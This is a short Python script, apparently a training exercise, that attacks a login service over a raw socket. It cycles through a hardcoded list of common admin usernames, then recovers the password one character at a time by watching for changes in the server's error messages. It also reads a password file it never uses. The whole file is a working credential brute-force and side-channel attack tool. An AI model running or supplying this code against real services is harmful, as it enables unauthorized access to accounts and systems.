import socket
import sys
import string
import json

path = "hacking\passwords.txt"
f = open(path, 'r')
password = f.read().split("\n")
logins_list = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user',
               'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser',
               'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']


class Connection():
    def __init__(self, host, port):
        self.hostname = host
        self.port = int(port)
        self.sock = socket.socket()
        self.myList = [" "] + list(string.ascii_uppercase) + list(string.ascii_lowercase) + list(str(1234567890))
        self.connect()
        self.login_found = ''
        self.password_found = ''

    def connect(self):
        with socket.socket() as self.sock:
            address = (self.hostname, self.port)
            self.sock.connect(address)
            self.hacks()

    def send_receive(self, msg):
        data = msg.encode()
        # sending through socket
        self.sock.sendall(data)
        response = self.sock.recv(1024)
        response = response.decode()
        return response

    def check_password(self):
        pass

    def hacks(self):
        self.password_found = ''
        for i in logins_list:
            m = {"login": i, "password": self.password_found}
            data = json.dumps(m)
            pss = self.send_receive(data)
            if pss[12:-2] != "Wrong login!":
                self.login_found = i
                break
        for j in self.myList:
            for i in self.myList:
                m = {"login": self.login_found, "password": self.password_found + i}
                data = json.dumps(m)
                pss = self.send_receive(data)
                if pss[12:-2] == "Connection success!":
                    self.password_found += i
                    d = {"login": self.login_found, "password": self.password_found}
                    print(json.dumps(d))
                    quit()
                if pss[12:-1] != "Wrong password!":
                    self.password_found += i
                    break


args = sys.argv
connection = Connection(host=args[1], port=args[2])
